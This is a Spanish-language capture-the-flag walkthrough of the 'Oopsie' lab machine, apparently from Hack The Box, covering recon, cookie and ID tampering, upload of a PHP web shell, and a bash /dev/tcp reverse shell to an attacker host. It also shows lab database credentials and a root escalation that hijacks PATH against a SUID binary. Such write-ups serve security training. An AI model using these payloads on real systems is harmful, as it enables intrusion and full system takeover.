# Oopsie

🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.139.174

PING 10.129.139.174 (10.129.139.174) 56(84) bytes of data.
64 bytes from 10.129.139.174: icmp_seq=1 ttl=63 time=223 ms

--- 10.129.139.174 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 223.273/223.273/223.273/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --min-rate 5000 -n -Pn -vvv 10.129.139.174 -oG openPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 22,80 -sCV 10.129.139.174 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión                                                      |
| ------ | -------- | ------------------------------------------------------------ |
| 22     | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80     | http     | Apache httpd 2.4.29 ((Ubuntu))                               |

🗹 Enumerar posibles rutas:

```shell
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.139.174/FUZZ -t 80

themes                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 163ms]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 165ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 164ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5782ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 178ms]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 177ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 176ms]
```

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/apache.txt -u http://10.129.95.191/FUZZ -t 80

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 355ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 167ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 165ms]
```

🗹 En el código fuente se puede ver la ruta `<script src="/cdn-cgi/login/script.js"></script>` dentro de la etiqueta `<script>`.

🗹 Ingresar a la URL `http://10.129.107.1/cdn-cgi/login/` e ingresar como invitado haciendo click en `Login as Guest`.

🗹 En la sección `Account` en la URL modificar el valor del parámetro `id` por el número `1`.  Se obtienen los valores `Name` y `Access ID`.

🗹 Modificar el valor de la cookie `role` por el valor obtenido `Name` y el valor de la cookie `user` por  el valor obtenido de `Access ID`. Recargar la página e ir a la sección `Uploads` para verificar si ya podemos subir archivos.

🗹 Crear un archivo `php`:

```shell
<?php
	system($_GET['cmd']);
?>
```

🗹 Subir el archivo.

🗹 Poner en escucha la máquina atacante con `netcat`, `nc -lnvp 1234`.

🗹 En la URL en el directorio `uploads` ingresar al archivo subido pasarle el comando `bash -c "bash -i >& /dev/tcp/<ip-atacante>/<puerto> 0>&1"` al parámetro `cmd`, dejando la URL: `10.129.107.1/uploads/shell.php?cmd=bash -c "bash -i >& /dev/tcp/<ip-atacante>/<puerto> 0>&1"`.

🗹 En el directorio `/var/www/html/cdn-cgi/login` se encuentra el archivo `db.php` en el que se encuentran los datos para acceder a la base de datos:

```shell
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php 

<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

🗹 Cambiar al usuario `robert` con la contraseña encontrada `M3g4C0rpUs3r!`.
## User flag

La flag del usuario está en el directorio `/home/robert/user.txt`.

🗹 Ver a que grupos pertenece el usuario `robert`:

```shell
robert@oopsie:/var/www/html/cdn-cgi/login$ id

uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

🗹 Al listar los permisos del binario `bugtracker` se ve que tiene permisos SUID.

🗹 Al ejecutar el binario `bugtracker` pide un número de reporte y al indicarle un número de reporte inexistente vemos que realizar un `cat` del número de reporte indicado dentro del directorio `/root/reports/`.

🗹 Crear un archivo `cat` dentro del directorio `/tmp`:

```shell
#!/bin/bash

/bin/bash -p
```

🗹 Modificar el **PATH** para que cuando el binario `bugtracker` haga el cat en vez de buscarlo en la ruta perteneciente al `cat` real lo busque en el directorio `\tmp` y como el binario `bugtracker` tiene permisos **SUID** cuando ejecute el `cat` creado en el directorio `/tmp` lo va a ejecutar como el usuario `root` y va a ejecutar el comando `bash -p`:

```shell
export PATH=/tmp:$PATH
```

🗹 Ejecutar el binario `bugtracker`.
## Root flag

La flag se encuentra en el directorio `/root`.
